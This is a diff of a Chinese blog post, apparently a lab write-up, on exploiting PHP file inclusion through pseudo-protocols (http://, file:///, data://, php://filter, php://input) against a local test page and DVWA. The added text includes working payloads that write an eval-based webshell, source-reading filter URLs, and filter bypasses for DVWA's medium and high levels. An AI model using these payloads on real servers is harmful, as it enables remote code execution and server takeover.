@@ -15,11 +15,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="通过dvwa的例题来展示如何利用PHP的一系列伪协议利用文件包含漏洞">
+  <meta name="description" content="通过本地实验环境和dvwa的例题展示如何结合一系列伪协议来利用文件包含漏洞">
   <meta name="author" content="Eggs">
   <meta name="keywords" content="Blog">
   
-  <title>文件包含PHP伪协议的使用 - 蛋窝窝</title>
+  <title>文件包含伪协议实践 - 蛋窝窝</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -168,7 +168,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="文件包含PHP伪协议的使用">
+            <span class="h2" id="subtitle" title="文件包含伪协议实践">
               
             </span>
 
@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      551 字
+      1.3k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      16
        分钟
     </span>
   
@@ -235,14 +235,58 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">文件包含PHP伪协议的使用</h1>
+            <h1 style="display: none">文件包含伪协议实践</h1>
             
             <div class="markdown-body">
-              <p>通过dvwa的例题来展示如何利用PHP的一系列伪协议利用文件包含漏洞</p>
+              <p>通过本地实验环境和dvwa的例题展示如何结合一系列伪协议来利用文件包含漏洞</p>
 <span id="more"></span>
 
 <hr>
-<h3 id="dvwa–FIle-Inclusion关卡设计"><a href="#dvwa–FIle-Inclusion关卡设计" class="headerlink" title="dvwa–FIle Inclusion关卡设计"></a>dvwa–FIle Inclusion关卡设计</h3><ul>
+<h3 id="本地实验环境"><a href="#本地实验环境" class="headerlink" title="本地实验环境"></a>本地实验环境</h3><p>127.0.0.1/a.php源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p>127.0.0.1/info.txt源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>目的：</p>
+<p>用伪协议实现文件包含或写入木马</p>
+<hr>
+<h3 id="伪协议使用实例"><a href="#伪协议使用实例" class="headerlink" title="伪协议使用实例"></a>伪协议使用实例</h3><h4 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h4><p>需要allow_url_fopen与allow_url_include同时开启</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/a.php?page=http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/info.txt<br></code></pre></div></td></tr></table></figure>
+
+<p>如果能够使用那么效果会十分显著，木马文件在我们服务器上，却能直接控制对方的服务器</p>
+<h4 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h4><p><strong>只能以绝对路径的方式包含本地文件</strong></p>
+<p>感觉file加了不如不加。。因为文件包含不用伪协议还能用相对路径。。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/a.php?page=file:///F:\aaa\bbb\info.txt</span><br></code></pre></div></td></tr></table></figure>
+
+<p>需要知道目标服务器的文件路径，有时可通过报错信息得知</p>
+<p>个人感觉比较鸡肋。。在dvwa中刚好满足白名单要求才有用得以绕过</p>
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>需要 allow_url_include:On allow_url_fopen:On</p>
+<p>可以直接写入PHP代码执行</p>
+<p>写入PHP木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?PHP</span> fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[eggs])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></div></td></tr></table></figure>
+
+
+
+
+
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>需要开启 allow_url_fopen，不需要开启 allow_url_include</p>
+<p>如果开启了allow_url_include的话可以在resource参数后加上HTTP协议</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220401231855.png" srcset="/img/loading.gif" lazyload></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><em>大佬写的👀</em></p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/resource=info.txt	</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=info.txt</span><br>http:<span class="hljs-comment">//127.0.0.1/a.php?page=php://filter/resource=http://127.0.0.1/info.txt</span><br><br><span class="hljs-comment">//结合来看就算是不用过滤器，也能指定远程文件包含木马</span><br></code></pre></div></td></tr></table></figure>
+
+<p>read模式下+过滤器读源码很好用。另外根据大佬的博客，我们可以在传递参数时利用write模式+过滤器破坏页面中代码结构来绕过防护。</p>
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以直接写入PHP代码来执行当，enctype=multipart/form-data时,php:/input将会无效</p>
+<p>传递以下post数据包来写入木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//</span><br><br><span class="hljs-meta">&lt;?PHP</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[eggs])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>图例：</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220402165611.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h3 id="dvwa–FIle-Inclusion实践"><a href="#dvwa–FIle-Inclusion实践" class="headerlink" title="dvwa–FIle Inclusion实践"></a>dvwa–FIle Inclusion实践</h3><p>关卡设计：</p>
+<ul>
 <li><p>Local File Inclusion (LFI) </p>
 <p>让我们用本地文件包含读取路径为<code>../../hackable/flags/fi.php</code>的文件。这个文件一共有五个句子，其中的1，2，4是直接用echo语句输出的，所以直接包含该文件时就可以看到，3在编译时被覆盖了，只能通过源码看到，5被写在了html注释里，被包含后F12就能看到。综上，我们除了实现直接包含文件外，还要考虑怎么读取php页面源码。</p>
 </li>
@@ -254,34 +298,39 @@
 <p>另外，也可以在我们的页面布置这个PHP文件：</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php assert($_POST[eggs]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
 
-<p>在站点构造url远程包含该文件，在其目录下生成shell.php后用蚁剑直接连（不用设置cookie）</p>
-</li>
-<li><p>low 完全没防护</p>
-</li>
-<li><p>medium </p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-comment">//这句话中多打了个双引号，&quot;..\\&quot;&quot;过滤的是..，所以可以直接用..\绕过</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
+<p>在站点构造url，使用HTTP协议远程包含该文件，在其目录下生成shell.php后用蚁剑直接连（不用设置cookie）</p>
+<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>完全没防护</p>
+<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-comment">//这句话中多打了个双引号，&quot;..\\&quot;&quot;过滤的是..，所以可以直接用..\绕过</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
 
-<p>双写（RFI）：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=httphttp://://127.0.0.1/eggs.txt</code>，或者利用PHP伪协议，<code>php://input</code>、<code>php://data</code></p>
-</li>
-<li><div class="hljs code-wrapper"><pre><code class="php">&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
-
-// Input validation
-if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;
-    // This isn&#39;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-&#125;
-
-?&gt; 
-</code></pre></div>
-<p>要求输入的参数<code>page</code>必须以<code>file</code>开头，所以可以利用file：</p>
+<p>双写（RFI）：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=httphttp://://127.0.0.1/eggs.txt</code>，或者利用PHP伪协议，<code>php://input</code>、<code>php://data</code>和<code>php://filter</code></p>
 </li>
 </ul>
+<p>​        突破方法大同小异，我上面的payload改一改就行了</p>
+<ul>
+<li><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
+
+<p>要求输入的参数<code>page</code>必须以<code>file</code>开头，所以可以利用file:///协议读取本地文件（需知晓服务器文件路径，在这里可从报错信息中得知），或结合文件上传漏洞运行木马</p>
+</li>
+</ul>
+<h3 id="伪协议使用总结"><a href="#伪协议使用总结" class="headerlink" title="伪协议使用总结"></a>伪协议使用总结</h3><ul>
+<li><p>http://</p>
+<p>allow_url_fopen与allow_url_include都需要开启 </p>
+<p>简单明了好用 </p>
+</li>
+<li><p>php://filter </p>
+<p>常用read模式，如果开启allow_url_include的话和HTTP一样好用，就算没开启也能方便的读取页面源码</p>
+</li>
+<li><p>php://input和php://data</p>
+<p>写入可执行PHP代码，PHP木马</p>
+</li>
+<li><p>file：///</p>
+<p>只能以绝对路径读取本地文件，鸡肋</p>
+</li>
+</ul>
+<p>以上伪协议（除了写入代码的input和data）配合文件上传漏洞能更好发挥作用</p>
 <hr>
-<h3 id="PHP伪协议的详细利用"><a href="#PHP伪协议的详细利用" class="headerlink" title="PHP伪协议的详细利用"></a>PHP伪协议的详细利用</h3>
+<p>完结 : )🐣</p>
+
             </div>
             <hr>
             <div>
